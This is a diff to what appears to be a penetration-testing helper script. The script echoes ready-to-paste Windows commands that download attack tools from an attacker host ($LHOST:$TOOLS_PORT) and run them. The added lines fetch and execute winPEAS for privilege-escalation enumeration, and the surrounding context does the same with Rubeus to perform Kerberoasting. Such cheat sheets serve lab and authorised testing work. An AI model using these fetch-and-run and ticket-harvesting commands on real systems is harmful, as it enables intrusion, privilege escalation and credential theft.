@@ -67,6 +67,9 @@ echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe C:\
 echo
 echo "iwr -Uri http://$LHOST:$TOOLS_PORT/windows/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe | C:\Windows\Temp\Rubeus.exe kerberoast /nowrap"
 echo
+echo "Winpeas"
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/winpeas/winPEASany.exe -Outfile C:\Windows\Temp\winpeas.exe | C:\Windows\Temp\winpeas.exe"
+echo
 echo
 
 echo '********** Linux **********'
